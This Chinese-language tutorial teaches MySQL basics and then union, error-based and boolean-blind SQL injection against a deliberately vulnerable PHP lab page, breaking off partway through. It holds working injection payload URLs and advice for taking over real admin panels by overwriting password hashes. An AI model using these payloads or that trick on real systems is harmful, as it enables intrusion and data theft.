该篇文章大纲

    
    
    1.mysql讲解
    2.数据库实战利用
    3.php连接mysql
    4.information_schema数据库讲解
    5.联合注入
    6.报错注入
    7.布尔盲注
    8.时间盲注
    9.post注入
    10.联合注入exp编写
    11.报错注入exp编写
    12.布尔盲注exp编写
    13.sql注入bypass waf
    14.sql注入代码审计

# 0x01 mysql讲解

### 1.1 数据库创建

    
    
    mysql> create database school;
    Query OK, 1 row affected (0.00 sec)

### 1.2 查询数据库

    
    
    mysql> show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | admin              |
    | message            |
    | mysql              |
    | performance_schema |
    | school             |
    | test               |
    | ziansec            |
    +--------------------+
    8 rows in set (0.00 sec)

### 1.3 创建表

    
    
    mysql> create table student(id int(10),username varchar(20),mail varchar(20));
    Query OK, 0 rows affected (0.00 sec)

### 1.4 查询表结构 | 查询表

    
    
    mysql> show tables;
    +------------------+
    | Tables_in_school |
    +------------------+
    | student          |
    +------------------+
    1 row in set (0.00 sec)
    
    mysql> desc student;
    +----------+-------------+------+-----+---------+-------+
    | Field    | Type        | Null | Key | Default | Extra |
    +----------+-------------+------+-----+---------+-------+
    | id       | int(10)     | YES  |     | NULL    |       |
    | username | varchar(20) | YES  |     | NULL    |       |
    | mail     | varchar(20) | YES  |     | NULL    |       |
    +----------+-------------+------+-----+---------+-------+
    3 rows in set (0.00 sec)

### 1.5 插入数据

    
    
    mysql> insert into student(id,username,mail) values(1,"zhangsan","zs@redteam.com");
    Query OK, 1 row affected (0.00 sec)
    
    mysql> insert into student(id,username,mail) values(2,"lisi","ls@redteam.com");
    Query OK, 1 row affected (0.00 sec)

### 1.6 查询数据

    
    
    mysql> select mail from student;
    +----------------+
    | mail           |
    +----------------+
    | zs@redteam.com |
    | ls@redteam.com |
    +----------------+
    2 rows in set (0.02 sec)
    
    mysql> select * from student;
    +------+----------+----------------+
    | id   | username | mail           |
    +------+----------+----------------+
    |    1 | zhangsan | zs@redteam.com |
    |    2 | lisi     | ls@redteam.com |
    +------+----------+----------------+
    2 rows in set (0.00 sec)

### 1.7 修改数据

    
    
    mysql> update student set username="zhangsan2" where id = 1 ;
    Query OK, 1 row affected (0.00 sec)
    Rows matched: 1  Changed: 1  Warnings: 0
    
    mysql> select * from student;
    +------+-----------+----------------+
    | id   | username  | mail           |
    +------+-----------+----------------+
    |    1 | zhangsan2 | zs@redteam.com |
    |    2 | lisi      | ls@redteam.com |
    +------+-----------+----------------+
    2 rows in set (0.00 sec)

### 1.8 删除数据

    
    
    mysql> delete from student where id = 1;
    Query OK, 1 row affected (0.00 sec)
    
    mysql> select * from student;
    +------+----------+----------------+
    | id   | username | mail           |
    +------+----------+----------------+
    |    2 | lisi     | ls@redteam.com |
    +------+----------+----------------+
    1 row in set (0.00 sec)

### 1.9 删除表

    
    
    mysql> drop table student;
    Query OK, 0 rows affected (0.00 sec)
    
    mysql> show tables;
    Empty set (0.00 sec)

### 1.10 删除数据库

    
    
    mysql> drop database school;
    Query OK, 1 row affected (0.00 sec)
    
    mysql> show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | admin              |
    | message            |
    | mysql              |
    | performance_schema |
    | test               |
    | ziansec            |
    +--------------------+
    7 rows in set (0.00 sec)

# 0x02 数据库实战利用

    
    
    我们学习要思考他的实战价值而不是盲目去学习，可能有人会问我实战为什么要去学习数据库？
    1.实战拿到phpmyadmin且无法通过漏洞或者into outfile或者日志去shell，此时后台密码解不开且为md5如何解决，update修改密码为123456的md5即可shell后记得改回来
    2.遇到wp或者fastadmin此类公开cms后台密码无法解开同理，可以在本地搭建该cms然后本地密码设置为123456看加密后的值，再修改目标数据库即可。
    
    数据库修改 fa_admin 表的两个字段
    密码 (password)：c13f62012fd6a8fdf06b3452a94430e5
    密码盐 (salt)：rpR6Bv
    登录密码是 123456

# 0x03 php连接mysql

    
    
    <?php
    $host = "localhost";
    $user = "root";
    $pass = "root";
    
    $conn = mysql_connect($host,$user,$pass);
    mysql_select_db("school");
    $sql = "select * from student";
    $result = mysql_query($sql);
    while($row = mysql_fetch_array($result)){
        echo "id:".$row["id"]." username:".$row["username"]." mail:".$row["mail"]."<br>";
    }
    ?>
    
    
    mysql_connect() 函数打开非持久的 MySQL 连接
    mysql_select_db() 选择数据库
    mysql_query() 执行sql语句
    mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有。返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。

![](./img/1221627551220527960.png)

# 0x04 information_schema数据库讲解

在 mysql 5.0 以上新增了名为`information_schema` 数据库。

    
    
    mysql> show databases;
    ERROR 2006 (HY000): MySQL server has gone away
    No connection. Trying to reconnect...
    Connection id: 17
    Current database: school
    +--------------------+
    | Database |
    +--------------------+
    | information_schema |
    | login |
    | message |
    | mysql |
    | performance_schema |
    | school |
    | sys |
    +--------------------+
    7 rows in set (0.00 sec)

查询 information_schema 数据库里面的所有表。

    
    
    mysql> use information_schema;
    Database changed
    mysql> show tables;
    +---------------------------------------+
    | Tables_in_information_schema |
    +---------------------------------------+
    | CHARACTER_SETS |
    | COLLATIONS |
    | COLLATION_CHARACTER_SET_APPLICABILITY |
    | COLUMNS |
    | COLUMN_PRIVILEGES |
    | ENGINES |
    | EVENTS |
    | FILES |
    | GLOBAL_STATUS |
    | GLOBAL_VARIABLES |
    | KEY_COLUMN_USAGE |
    | OPTIMIZER_TRACE |
    | PARAMETERS |
    | PARTITIONS |
    | PLUGINS |
    | PROCESSLIST |
    | PROFILING |
    | REFERENTIAL_CONSTRAINTS |
    | ROUTINES |
    | SCHEMATA |
    | SCHEMA_PRIVILEGES |
    | SESSION_STATUS |
    | SESSION_VARIABLES |
    | STATISTICS |
    | TABLES |
    | TABLESPACES |
    | TABLE_CONSTRAINTS |
    | TABLE_PRIVILEGES |
    | TRIGGERS |
    | USER_PRIVILEGES |
    | VIEWS |
    | INNODB_LOCKS |
    | INNODB_TRX |
    | INNODB_SYS_DATAFILES |
    | INNODB_FT_CONFIG |
    | INNODB_SYS_VIRTUAL |
    | INNODB_CMP |
    | INNODB_FT_BEING_DELETED |
    | INNODB_CMP_RESET |
    | INNODB_CMP_PER_INDEX |
    | INNODB_CMPMEM_RESET |
    | INNODB_FT_DELETED |
    | INNODB_BUFFER_PAGE_LRU |
    | INNODB_LOCK_WAITS |
    | INNODB_TEMP_TABLE_INFO |
    | INNODB_SYS_INDEXES |
    | INNODB_SYS_TABLES |
    | INNODB_SYS_FIELDS |
    | INNODB_CMP_PER_INDEX_RESET |
    | INNODB_BUFFER_PAGE |
    | INNODB_FT_DEFAULT_STOPWORD |
    | INNODB_FT_INDEX_TABLE |
    | INNODB_FT_INDEX_CACHE |
    | INNODB_SYS_TABLESPACES |
    | INNODB_METRICS |
    | INNODB_SYS_FOREIGN_COLS |
    | INNODB_CMPMEM |
    | INNODB_BUFFER_POOL_STATS |
    | INNODB_SYS_COLUMNS |
    | INNODB_SYS_FOREIGN |
    | INNODB_SYS_TABLESTATS |
    +---------------------------------------+
    61 rows in set (0.00 sec)

其中需要关注的是 `tables`表和 `columns`表。前者存储了数据库内每个库的表名，后者存储了数据库内

每个库中的每个表的列名。查询下两个表的架构。

**tables**

    
    
    mysql> desc tables;
    +-----------------+---------------------+------+-----+---------+-------+
    | Field | Type | Null | Key | Default | Extra |
    +-----------------+---------------------+------+-----+---------+-------+
    | TABLE_CATALOG | varchar(512) | NO | | | |
    | TABLE_SCHEMA | varchar(64) | NO | | | |
    | TABLE_NAME | varchar(64) | NO | | | |
    | TABLE_TYPE | varchar(64) | NO | | | |
    | ENGINE | varchar(64) | YES | | NULL | |
    | VERSION | bigint(21) unsigned | YES | | NULL | |
    | ROW_FORMAT | varchar(10) | YES | | NULL | |
    | TABLE_ROWS | bigint(21) unsigned | YES | | NULL | |
    | AVG_ROW_LENGTH | bigint(21) unsigned | YES | | NULL | |
    | DATA_LENGTH | bigint(21) unsigned | YES | | NULL | |
    | MAX_DATA_LENGTH | bigint(21) unsigned | YES | | NULL | |
    | INDEX_LENGTH | bigint(21) unsigned | YES | | NULL | |
    | DATA_FREE | bigint(21) unsigned | YES | | NULL | |
    | AUTO_INCREMENT | bigint(21) unsigned | YES | | NULL | |
    | CREATE_TIME | datetime | YES | | NULL | |
    | UPDATE_TIME | datetime | YES | | NULL | |
    | CHECK_TIME | datetime | YES | | NULL | |
    | TABLE_COLLATION | varchar(32) | YES | | NULL | |
    | CHECKSUM | bigint(21) unsigned | YES | | NULL | |
    | CREATE_OPTIONS | varchar(255) | YES | | NULL | |
    | TABLE_COMMENT | varchar(2048) | NO | | | |
    +-----------------+---------------------+------+-----+---------+-------+
    21 rows in set (0.00 sec)

在 tables 表中需要关注的列名为：`table_schema` ， `table_name`。其中 `table_name`为整个mysql数

据库内所有的表名, `table_schema`为 `table_name`对应的数据库名。例如我们上节课当中的 `school`数

据库中存在 `xinan`这个表。我们就可以通过 `information_schema.tables` 查询出来。

    
    
    mysql> select table_name from tables where table_schema="school";
    +------------+
    | table_name |
    +------------+
    | xinan |
    +------------+
    1 row in set (0.00 sec)

**columns**

    
    
    mysql> desc columns;
    +--------------------------+---------------------+------+-----+---------+-------    +
    | Field | Type | Null | Key | Default | Extra
    |
    +--------------------------+---------------------+------+-----+---------+-------    +
    | TABLE_CATALOG | varchar(512) | NO | | |
    |
    | TABLE_SCHEMA | varchar(64) | NO | | |
    |
    | TABLE_NAME | varchar(64) | NO | | |
    |
    | COLUMN_NAME | varchar(64) | NO | | |
    |
    | ORDINAL_POSITION | bigint(21) unsigned | NO | | 0 |
    |
    | COLUMN_DEFAULT | longtext | YES | | NULL |
    |
    | IS_NULLABLE | varchar(3) | NO | | |
    |
    | DATA_TYPE | varchar(64) | NO | | |
    |
    | CHARACTER_MAXIMUM_LENGTH | bigint(21) unsigned | YES | | NULL |
    |
    | CHARACTER_OCTET_LENGTH | bigint(21) unsigned | YES | | NULL |
    |
    | NUMERIC_PRECISION | bigint(21) unsigned | YES | | NULL |
    |
    | NUMERIC_SCALE | bigint(21) unsigned | YES | | NULL |
    |
    | DATETIME_PRECISION | bigint(21) unsigned | YES | | NULL |
    |
    | CHARACTER_SET_NAME | varchar(32) | YES | | NULL |
    |
    | COLLATION_NAME | varchar(32) | YES | | NULL |
    |
    | COLUMN_TYPE | longtext | NO | | NULL |
    |
    | COLUMN_KEY | varchar(3) | NO | | |
    |
    | EXTRA | varchar(30) | NO | | |
    |
    | PRIVILEGES | varchar(80) | NO | | |
    |
    | COLUMN_COMMENT | varchar(1024) | NO | | |
    |
    | GENERATION_EXPRESSION | longtext | NO | | NULL |
    |
    +--------------------------+---------------------+------+-----+---------+-------    +
    21 rows in set (0.00 sec)

在 `columns`这个表当中需要关注的列名为： `column_name`, `table_name`, `table_schema`。后者就不做

多介绍跟前者是一样的,其中 `column_name`为整个mysql数据库内所有的列名。 `table_name`为该列名对

应的表名， `table_schema`为之对应的数据库名，例如我们查询 `school`数据库中 `xinan`数据表中的所

有字段名。

    
    
    mysql> select column_name from columns where table_name="xinan" and
    table_schema="school";
    +-------------+
    | column_name |
    +-------------+
    | id |
    | username |
    | phone |
    | mail |
    +-------------+
    4 rows in set (0.00 sec)

# 0x05 联合注入

联合查询。

    
    
    union用于把来自许多SELECT语句的结果组合到一个结果集合中

例如我们查询 `xinan`数据库中的数据，后面可以接上 `union`。依然能够查询出当前用户以及当前选择的

数据库。

    
    
    mysql> select * from xinan where id =1 union select user(),database();
    +----------------+----------+
    | id | username |
    +----------------+----------+
    | 1 | zhangsan |
    | root@localhost | school |
    +----------------+----------+
    2 rows in set (0.00 sec)

但是在实战当中可能只会显示上面一行，不会像在mysql终端这里显示两行，这个时候我们可以让前面

查询结果为空。例如查询 -1 。

    
    
    mysql> select * from xinan where id =-1 union select user(),database();
    +----------------+----------+
    | id | username |
    +----------------+----------+
    | root@localhost | school |
    +----------------+----------+
    1 row in set (0.00 sec)

我们在web页面来尝试下。可以看到成功获取到了当前用户以及数据库名。

![](./img/1853896173937939848.png)

这里我们查询 `union select 1,2` 试试。

    
    
    mysql> select * from xinan union select 1,2,3,4;
    ERROR 1222 (21000): The used SELECT statements have a different number of
    columns

报错内容就是说联合查询的个数跟原本 `xinan`表中的列的数量不一样。所以我们在实战当中是不知道目

标该数据库存在多少列的所以我们要首先获取列的数量。

这里可以通过 `order by` 方法。该方法是通过升序排序用的，如果是 `order by 1` 表示按照第一列从低

到高排序

    
    
    mysql> select * from xinan where id =1 order by 1;
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)
    mysql> select * from xinan where id =1 order by 2;
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)
    mysql> select * from xinan where id =1 order by 3;
    ERROR 1054 (42S22): Unknown column '3' in 'order clause'

order by 1表示按照 id 字段排序，`order by 3` 因为没有第三列所以会报错。

![](./img/9178901956404581954.png)

得知存在2列之后还需要知道回显哪几位，例如你想要得到数据你就要通过眼睛看到该数据。

![](./img/4855091336218885288.png)

我们可以看到代码，当存在参数的时候显示出来的是`id,username`也就是对应的 1,2，假如压根代码不输

出 `id`字段，你在通过联合查询语法为： `union select database(),2`当然就不会回显出数据库名。所

以我们还需要知道到底回显那几个位置.

![](./img/494410312009335152.png)

当都回显的时候就可以插入任意位置了。

**获取所有表信息**

select database() 。当 use 的那个数据库就会显示那个数据库。

    
    
    mysql> use information_schema;
    Database changed
    mysql> select database();
    +--------------------+
    | database() |
    +--------------------+
    | information_schema |
    +--------------------+
    1 row in set (0.00 sec)
    mysql> use school;
    Database changed
    mysql> select database();
    +------------+
    | database() |
    +------------+
    | school |
    +------------+
    1 row in set (0.01 sec)

因为在php代码中想要查询到学生信息，那么就要选择一个数据库，所以当我们在web页面执行 select database()的时候就会显示school库。

![](./img/3484571715352850508.png)

查询所有表信息可以通过 `information_schema`该数据库查询,以下两个语法都可以。

    
    
    select table_name from information_schema.tables where table_schema=database()
    select table_name from information_schema.tables where table_schema="school"

带入到web当中即为：

    
    
    http://192.168.1.9/gkk/school/index.php?id=-1 union select
    1,group_concat(table_name) from information_schema.tables where
    table_schema=database()

如果出现 `ERROR 1271 (HY000): Illegal mix of collations for operation 'UNION'`即为编码

问题。 mysql 执行如下。

    
    
    ALTER TABLE
    `xinan`
    CHANGE
    `username`
    `username` VARCHAR(191)
    CHARACTER SET
    utf8
    COLLATE
    utf8_general_ci
    NULL
    DEFAULT NULL;

![](./img/5966547290931418987.png)

**查询指定表的列名**

查询指定表的列名可以通过 `information_schema`该数据库查询，可以 通过以下语法。

    
    
    select column_name from information_schema.columns where table_schema=database()
    and table_name = "xinan";
    select column_name from information_schema.columns where table_schema="school"
    and table_name = "xinan";

带入到web当中即为：

    
    
    http://192.168.1.9/gkk/school/index.php?id=-1 union select
    1,group_concat(column_name) from information_schema.columns where
    table_schema=database() and table_name = "xinan"

![](./img/8990383841661166293.png)

**查询数据**

带入到web当中即为：

    
    
    http://192.168.1.9/gkk/school/index.php?id=-1 union select 1,group_concat(username) from xinan

![](./img/5030033540367753974.png)

# 0x06 报错注入

**updatexml函数**

    
    
    UPDATEXML (XML_document, XPath_string, new_value);
    第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
    第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
    第三个参数：new_value，String格式，替换查找到的符合条件的数据

**concat函数**

函数用于将多个字符串连接成一个字符串

    
    
    mysql> select concat(0x7e,user(),0x7e);
    +--------------------------+
    | concat(0x7e,user(),0x7e) |
    +--------------------------+
    | ~root@localhost~ |
    +--------------------------+
    1 row in set (0.00 sec)

两者配合

    
    
    mysql> select * from xinan where id =1 and
    updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e),1);
    ERROR 1105 (HY000): XPATH syntax error: '~school~root@localhost~'

上节课我们说到联合注入要通过回显结果到web页面我们才能对应输出我们想要获取到的内容。

![](./img/8640083997953259971.png)

我们修改代码。

![](./img/6760852206662646956.png)

不输出就无法进行联合注入。对于报错注入来说就是通过回显mysql语法报错到web页面，因为在

php+mysql当中我们的mysql语法可能会存在问题，但是对于php这一个层面来讲他是不认识mysql的所

以就会正常但是带入到mysql当中就出现了问题，于是php为了针对这种现象就开发了 mysql_error()

函数，假如mysql语法报错也会显示到页面。

![](./img/8551149603190486240.png)

**获取数据库以及用户。**

    
    
    http://127.0.0.1/gkk/school/error/index.php?id=1 and
    updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e),1)

![](./img/3596241851072867045.png)

**获取表名。**

    
    
    mysql> select * from xinan where id =1 and updatexml(1,concat(0x7e,(select
    group_concat(table_name) from information_schema.tables where
    table_schema=database()),0x7e),1);
    ERROR 1105 (HY000): XPATH syntax error: '~xinan~'

所以带入到web当中就是

    
    
    http://127.0.0.1/gkk/school/error/index.php?id=1 and updatexml(1,concat(0x7e,
    (select group_concat(table_name) from information_schema.tables where
    table_schema=database()),0x7e),1)

![](./img/693647575575447398.png)

这只是我们的实验环境真实环境可能会存在很多甚至上百个表，可能其中百分之99都不是我们想要的

表，例如我们当前再创建几个无用表。

    
    
    mysql> show tables;
    +------------------+
    | Tables_in_school |
    +------------------+
    | test |
    | test1 |
    | test2 |
    | test3 |
    | test4 |
    | test5 |
    | xinan |
    +------------------+
    7 rows in set (0.00 sec)

我们再通过上面的语法来查询。

    
    
    mysql> select * from xinan where id =1 and updatexml(1,concat(0x7e,(select
    group_concat(table_name) from information_schema.tables where
    table_schema=database()),0x7e),1);
    ERROR 1105 (HY000): XPATH syntax error: '~test,test1,test2,test3,test4,te'

可以看到是不会显示完全的。

**limit** 函数

这个时候就可以通过 limit 来限制输出。

    
    
    mysql> select * from xinan;
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    | 2 | lisi |
    +------+----------+
    2 rows in set (0.00 sec)
    mysql> select * from xinan limit 0,1;
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)

limit 0,1 就是选择从第0个开始只输出1个。

    
    
    mysql> select * from xinan where id =1 and updatexml(1,concat(0x7e,(select
    table_name from information_schema.tables where table_schema=database() limit
    4,1),0x7e),1);
    ERROR 1105 (HY000): XPATH syntax error: '~test4~'
    mysql> select * from xinan where id =1 and updatexml(1,concat(0x7e,(select
    table_name from information_schema.tables where table_schema=database() limit
    5,1),0x7e),1);
    ERROR 1105 (HY000): XPATH syntax error: '~test5~'
    mysql> select * from xinan where id =1 and updatexml(1,concat(0x7e,(select
    table_name from information_schema.tables where table_schema=database() limit
    6,1),0x7e),1);
    ERROR 1105 (HY000): XPATH syntax error: '~xinan~'

可以通过这样的方式来进行输出，当然也可以首先通过 count 函数来判断有多少个表名。

    
    
    mysql> select * from xinan where id =1 and updatexml(1,concat(0x7e,(select
    count(table_name) from information_schema.tables where
    table_schema=database()),0x7e),1);
    ERROR 1105 (HY000): XPATH syntax error: '~7~'

带入到web页面中：

    
    
    http://127.0.0.1/gkk/school/error/index.php?id=1 and updatexml(1,concat(0x7e,
    (select table_name from information_schema.tables where table_schema=database()
    limit 6,1),0x7e),1)

![](./img/5750555613978354822.png)

**获取列名**

首先获取列名数量。

    
    
    mysql> select * from xinan where id =1 and updatexml(1,concat(0x7e,(select
    count(column_name) from information_schema.columns where table_schema=database()
    and table_name="xinan"),0x7e),1);
    ERROR 1105 (HY000): XPATH syntax error: '~2~'

然后依次获取

    
    
    mysql> select * from xinan where id =1 and updatexml(1,concat(0x7e,(select
    column_name from information_schema.columns where table_schema=database() and
    table_name="xinan" limit 0,1),0x7e),1);
    ERROR 1105 (HY000): XPATH syntax error: '~id~'
    mysql> select * from xinan where id =1 and updatexml(1,concat(0x7e,(select
    column_name from information_schema.columns where table_schema=database() and
    table_name="xinan" limit 1,1),0x7e),1);
    ERROR 1105 (HY000): XPATH syntax error: '~username~'

limit 1,1 就是从第1个开始获取1个。  
带入到web中：

    
    
    http://127.0.0.1/gkk/school/error/index.php?id=1%20and%20updatexml(1,concat(0x7e,
    (select%20column_name%20from%20information_schema.columns%20where%20table_schema
    =database()%20and%20table_name=%22xinan%22%20limit%201,1),0x7e),1)

![](./img/1735458550695251548.png)

**查询数据**

    
    
    mysql> select * from xinan where id =1 and updatexml(1,concat(0x7e,(select
    group_concat(username,0x7e,id) from xinan limit 0,1),0x7e),1);
    ERROR 1105 (HY000): XPATH syntax error: '~zhangsan~1,lisi~2~'

# 0x07 布尔盲注

php代码

    
    
    <?php
    include("../config.php");
    error_reporting(0);
    $id = $_GET["id"];
    if(empty($id)){
    $sql = "select username,id from xinan";
    $result = mysql_query($sql);
    }else{
    $sql = "select * from xinan where id=$id";
    $result = mysql_query($sql);
    }
    while($row = mysql_fetch_array($result)){
    echo "yes";
    }
    ?>

当有结果就输出 yes ，没结果就什么都不输出。

1.length 判断字符串长度

    
    
    mysql> select length("aaa");
    +---------------+
    | length("aaa") |
    +---------------+
    | 3 |
    +---------------+
    1 row in set (0.00 sec)

2.截取字符串

    
    
    mysql> select user();
    +----------------+
    | user() |
    +----------------+
    | root@localhost |
    +----------------+
    1 row in set (0.00 sec)
    mysql> select substr(user(),1,1);
    +--------------------+
    | substr(user(),1,1) |
    +--------------------+
    | r |
    +--------------------+
    1 row in set (0.00 sec)
    mysql> select substr(user(),1,2);
    +--------------------+
    | substr(user(),1,2) |
    +--------------------+
    | ro |
    +--------------------+
    1 row in set (0.00 sec)

很多函数有些是从0开始排序，有些是从1开始排序。

3.限制输出

    
    
    mysql> select table_name from information_schema.tables where
    table_schema=database();
    +------------+
    | table_name |
    +------------+
    | login |
    | userinfo |
    +------------+
    2 rows in set (0.00 sec)
    mysql> select table_name from information_schema.tables where
    table_schema=database() limit 1,1;
    +------------+
    | table_name |
    +------------+
    | userinfo |
    +------------+
    1 row in set (0.00 sec)

4.ascii

    
    
    mysql> select ascii("a");
    +------------+
    | ascii("a") |
    +------------+
    | 97 |
    +------------+
    1 row in set (0.00 sec)

**获取数据库**

在布尔盲注中我们可以通过这些函数的配合。例如：

    
    
    mysql> select * from xinan where id =1 and length(database()) > 5;
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)
    mysql> select * from xinan where id =1 and length(database()) > 6;
    Empty set (0.00 sec)
    mysql> select * from xinan where id =1 and length(database()) =6;
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)

获取 `database()`也就是 `school`的长度，通过 `and`来连接当后面也正确的时候才返回正确结果。

![](./img/3031339242652105355.png)

获取到 `database()` 的长度后就要获取每个字符为多少。

    
    
    mysql> select * from xinan where id =1 and substr(database(),1,1)="s";
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)
    mysql> select * from xinan where id =1 and substr(database(),2,1)="c";
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)
    mysql> select * from xinan where id =1 and substr(database(),1,2)="sc";
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)

当然也可以通过大于小于来写。

    
    
    mysql> select * from xinan where id =1 and substr(database(),1,1)>"a";
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)
    mysql> select * from xinan where id =1 and substr(database(),1,1)>"y";
    Empty set (0.00 sec)
    mysql> select * from xinan where id =1 and substr(database(),1,1)="s";
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)

因为获取到的 `database()` 长度为6那么逐渐猜到 6,1 即可。因为 `substr`函数是从1开始算的。

**获取表名**

同理先获取表的长度。

    
    
    mysql> select * from xinan where id =1 and (select count(table_name) from
    information_schema.tables where table_schema=database()) > 7;
    Empty set (0.00 sec)
    mysql> select * from xinan where id =1 and (select count(table_name) from
    information_schema.tables where table_schema=database()) > 6;
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)

然后依次猜测表名。我们先开上帝之眼看看存在哪些表。

    
    
    mysql> show tables;
    +------------------+
    | Tables_in_school |
    +------------------+
    | test |
    | test1 |
    | test2 |
    | test3 |
    | test4 |
    | test5 |
    | xinan |
    +------------------+
    7 rows in set (0.00 sec)

例如我们猜测第一个 `test`。我们得知了表存在7个。因为大于7为空，大于6为真。

因为只能一个表一个表以及一个表中每个字符串的猜所有我们需要先获取到 `test`。通过 `limit`函数。

    
    
    mysql> select table_name from information_schema.tables where
    table_schema=database() limit 0,1;
    +------------+
    | table_name |
    +------------+
    | test |
    +------------+
    1 row in set (0.00 sec)

然后再获取第一个表的长度。

    
    
    mysql> select length((select table_name from information_schema.tables where
    table_schema=database() limit 0,1));
    +--------------------------------------------------------------------------------    --------------------+
    | length((select table_name from information_schema.tables where
    table_schema=database() limit 0,1)) |
    +--------------------------------------------------------------------------------    --------------------+
    |
    4 |
    +--------------------------------------------------------------------------------    --------------------+
    1 row in set (0.00 sec)

带入注入中就为：

首先判断存在表多少个。

    
    
    mysql> select * from xinan where id =1 and (select count(table_name) from
    information_schema.tables where table_schema=database()) > 6;
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)
    mysql> select * from xinan where id =1 and (select count(table_name) from
    information_schema.tables where table_schema=database()) > 7;
    Empty set (0.00 sec)

带入到web当中payload就为：

    
    
    and (select count(table_name) from information_schema.tables where
    table_schema=database()) > 7

然后获取第一个表的长度。带入到web当中就为：

    
    
    mysql> select * from xinan where id =1 and (length((select table_name from
    information_schema.tables where table_schema=database() limit 0,1))) > 4;
    Empty set (0.00 sec)
    mysql> select * from xinan where id =1 and (length((select table_name from
    information_schema.tables where table_schema=database() limit 0,1))) > 3;
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)

再获取第一个字符：

    
    
    mysql> select * from xinan where id =1 and (substr((select table_name from
    information_schema.tables where table_schema=database() limit 0,1),1,1)) > "s";
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)
    mysql> select * from xinan where id =1 and (substr((select table_name from
    information_schema.tables where table_schema=database() limit 0,1),1,1)) > "t";
    Empty set (0.00 sec)

`limit 0,1` 表示第一个 `test`， `substr()(),1,1)`表示猜测第一个字符。

例如我们猜测到 `xinan`的时候就为： `limit 6,1` 。

    
    
    mysql> select * from xinan where id =1 and (substr((select table_name from
    information_schema.tables where table_schema=database() limit 6,1),1,1)) = "x";
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)
    mysql> select * from xinan where id =1 and (substr((select table_name from
    information_schema.tables where table_schema=database() limit 6,1),2,1)) = "i";
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)

猜测得到存在`xinan`表，接下来就是猜测 `xinan`表里面存在多少个字段。

**获取字段**

获取字段数量：

    
    
    l> select * from xinan where id =1 and (select count(column_name) from
    information_schema.columns where table_schema=database() and table_name="xinan")
    > 1;
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)
    mysql> select * from xinan where id =1 and (select count(column_name) from
    information_schema.columns where table_schema=database() and table_name="xinan")
    > 2;
    Empty set (0.00 sec)

得到 `xinan`数据表存在两列。然后判断第一列长度，得知为2位。

    
    
    mysql> select * from xinan where id =1 and (length((select column_name from
    information_schema.columns where table_schema=database() and table_name="xinan"
    limit 0,1))) > 2;
    Empty set (0.01 sec)
    mysql> select * from xinan where id =1 and (length((select column_name from
    information_schema.columns where table_schema=database() and table_name="xinan"
    limit 0,1))) > 1;
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)

然后逐渐猜测：

    
    
    mysql> select * from xinan where id =1 and (substr((select column_name from
    information_schema.columns where table_schema=database() and table_name="xinan"
    limit 0,1),1,1)) = "i";
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)
    mysql> select * from xinan where id =1 and (substr((select column_name from
    information_schema.columns where table_schema=database() and table_name="xinan"
    limit 0,1),2,1)) = "d";
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.01 sec)

这里就自己猜，得到第一列为 `id`。然后就是获取第二个 `username`这里就只获取前两个后面一样的。

    
    
    mysql> select * from xinan where id =1 and (substr((select column_name from
    information_schema.columns where table_schema=database() and table_name="xinan"
    limit 1,1),1,1)) = "u";
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)
    mysql> select * from xinan where id =1 and (substr((select column_name from
    information_schema.columns where table_schema=database() and table_name="xinan"
    limit 1,1),2,1)) = "s";
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)

**获取数据**

首先获取第一条数据的长度。大于8报错大于7为真说明存在7位长度。

    
    
    mysql> select * from xinan where id =1 and (length((select username from xinan
    limit 0,1))) > 8;
    Empty set (0.00 sec)
    mysql> select * from xinan where id =1 and (length((select username from xinan
    limit 0,1))) > 7;
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)

然后就是获取第一条数据内容。

    
    
